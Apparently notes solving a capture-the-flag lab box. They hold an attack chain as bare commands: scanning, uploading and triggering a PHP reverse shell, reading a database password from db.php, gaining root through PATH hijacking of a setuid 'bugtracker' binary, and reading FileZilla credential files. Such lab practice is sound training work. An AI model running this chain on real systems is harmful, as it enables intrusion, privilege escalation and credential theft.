nmap -sS 10.10.10.28

Burp Suite
	Target
	Intruder

cdn-cgi/login

Upload
	/usr/share/webshells/php/php-reverse-shell.php

git clone https://github.com/maurosoria/dirsearch.git
cd dirsearch
python3 dirsearch.py -u http://10.10.10.28 -e php

curl http://10.10.10.28/uploads/php-reverse-shell.php

SHELL=/bin/bash script -q /dev/null
Ctrl-Z
stty raw -echo
fg
reset
xterm

######################

ls /var/www/html/cdn-cgi/login
cat /var/www/html/cdn-cgi/login/db.php

<?php
	$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>

id

find / -type f -group bugtracker 2>/dev/null

/usr/bin/bugtracker

ls -al /usr/bin/bugtracker

-rwsr-xr-- 1 root bugtracker 8792 Jan 25 10:14 /usr/bin/bugtracker

strings /usr/bin/bugtracker

export PATH=.:$PATH
echo '/bin/sh' > cat
chmod +x ./cat

/usr/bin/bugtracker

#

cat /root/.config/filezilla/*.xml

Done!